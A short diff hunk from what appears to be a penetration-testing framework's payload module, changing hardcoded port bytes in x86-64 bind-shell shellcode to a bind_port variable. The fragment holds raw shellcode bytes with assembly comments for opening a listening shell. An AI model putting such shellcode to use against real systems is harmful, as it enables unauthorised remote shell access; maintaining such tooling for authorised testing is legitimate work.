@@ -33,7 +33,7 @@ class Exploit(BindTCPPayloadMixin, ArchitectureSpecificPayload):
             b"\x48\x97" +                      # xchg   %rax,%rdi
             b"\x52" +                          # push   %rdx
             b"\xc7\x04\x24\x02\x00" +          # movl   $0xb3150002,(%rsp)
-            b"\x15\xb3" +                      #
+            bind_port +                        # port
             b"\x48\x89\xe6" +                  # mov    %rsp,%rsi
             b"\x6a\x10" +                      # pushq  $0x10
             b"\x5a" +                          # pop    %rdx
